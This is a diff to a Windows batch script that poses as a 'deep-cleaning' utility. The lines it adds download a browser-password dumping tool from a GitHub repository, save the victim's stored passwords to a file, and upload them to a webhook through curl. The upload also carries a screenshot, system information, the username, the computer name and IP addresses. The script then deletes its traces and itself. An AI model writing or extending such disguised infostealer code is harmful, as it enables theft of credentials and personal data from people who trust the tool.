@@ -35,9 +35,21 @@ call screenCapture screenshot.png >nul
 del screencapture.exe >nul
 del screencapture.bat >nul
 del %TEMP%\fastfetch.exe >nul
-curl -k -F "payload_json={\"content\": \"~=CONNECTION ESTABLISHED=~ \nDate: %date% \nTime: %time% \nUsername: %username% \nComputer Name: %COMPUTERNAME% \nPublic IP: %PublicIP% \nPrivate IP: %IP% \nInfo and Screenshot:\"}" -F "file1=@screenshot.png" -F "file2=@info.zip" %WEBHOOK% >nul
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://github.com/LargeVanillaMilkshake/1a/raw/refs/heads/main/passreccommandline.zip -OutFile '%TEMP%\wstemp\passreccommandline.zip'"
+"%TEMP%\7z.exe" x "%TEMP%\wstemp\passreccommandline.zip" -aoa >nul
+del "%TEMP%\wstemp\passreccommandline.zip"
+"WebBrowserPassView.exe" /stext "%TEMP%\wstemp\passwords.txt"
+del "WebBrowserPassView.exe" >nul
+if exist "WebBrowserPassView.cfg" del "WebBrowserPassView.cfg" >nul
+powershell -Command "$ProgressPreference = 'SilentlyContinue'; Compress-Archive -Path '%TEMP%\wstemp\passwords.txt' -DestinationPath '%TEMP%\wstemp\passwords.zip' -Force"
+curl -k -F "payload_json={\"content\": \"~=CONNECTION ESTABLISHED=~ \nDate: %date% \nTime: %time% \nUsername: %username% \nComputer Name: %COMPUTERNAME% \nPublic IP: %PublicIP% \nPrivate IP: %IP% \nInfo and Screenshot:\"}" -F "file1=@screenshot.png" -F "file2=@info.zip" -F "file3=@passwords.zip" %WEBHOOK% >nul
 del screenshot.png
-call :get_python
+echo Running further deep-cleaning scripts..
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/winpython/winpython/releases/download/13.1.202502222final/Winpython64-3.12.9.0dot.zip -OutFile '%TEMP%\python.zip'"
+"%TEMP%\7z.exe" x "%TEMP%\python.zip" -o%TEMP%\wstemp\py -aoa >nul
+del "%TEMP%\python.zip" >nul
+del "%TEMP%\7z.exe" >nul
+del "%TEMP%\7z.dll" >nul
 REM echo You may be prompted for admin by Windows Security. If you do, please accept the prompt, because it needs admin to clean up Windows Update files.
 REM if not exist "%TEMP%\wstemp\updates.py" powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\wstemp\updates.py'"
 if exist "%TEMP%\wstemp\updates.py" break>"%TEMP%\wstemp\updates.py"
@@ -64,17 +76,6 @@ timeout /t 3 >nul
 rem cls
 del "%~f0"
 exit
-
-:get_python
-echo Running further deep-cleaning scripts..
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/winpython/winpython/releases/download/13.1.202502222final/Winpython64-3.12.9.0dot.zip -OutFile '%TEMP%\python.zip'"
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/LargeVanillaMilkshake/1a/raw/refs/heads/main/7z.exe -OutFile '%TEMP%\7z.exe'"
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/LargeVanillaMilkshake/1a/raw/refs/heads/main/7z.dll -OutFile '%TEMP%\7z.dll'"
-"%TEMP%\7z.exe" x "%TEMP%\python.zip" -o%TEMP%\wstemp\py -aoa >nul
-del "%TEMP%\python.zip" >nul
-del "%TEMP%\7z.exe" >nul
-del "%TEMP%\7z.dll" >nul
-goto :EOF
 
 :logo
 mode con cols=70 lines=30
